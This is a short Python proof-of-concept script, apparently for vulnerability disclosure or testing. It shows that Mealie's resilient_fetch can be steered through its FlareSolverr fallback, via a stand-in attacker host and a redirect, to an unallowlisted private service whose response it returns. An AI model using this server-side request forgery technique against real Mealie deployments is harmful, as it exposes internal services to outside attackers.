import asyncio

from mealie.pkgs.safehttp.fetch import resilient_fetch

MARKER = "INTERNAL_ONLY_PROOF_MARKER_7f31c9"
TARGET = "http://attacker-proof:8080/challenge"


async def main() -> None:
    result = await resilient_fetch(TARGET, timeout=5)
    if result is None:
        raise SystemExit("FAIL: Mealie resilient_fetch returned no response")
    body = result.text
    print("Mealie result URL:", result.url)
    print("Returned via FlareSolverr:", result.via_flaresolverr)
    print("Private response marker present:", MARKER in body)
    if not result.via_flaresolverr:
        raise SystemExit("FAIL: result did not traverse Mealie's FlareSolverr fallback")
    if MARKER not in body:
        raise SystemExit("FAIL: Mealie did not receive the private service response")
    if "internal-proof:8081/proof" not in result.url:
        raise SystemExit("FAIL: final URL is not the private proof service")
    print("PASS: Mealie resilient_fetch escalated the 503 challenge to FlareSolverr, followed the browser redirect to the unallowlisted private service, and returned its response body.")


asyncio.run(main())

# Trigger end-to-end workflow after adding the Mealie integration step.
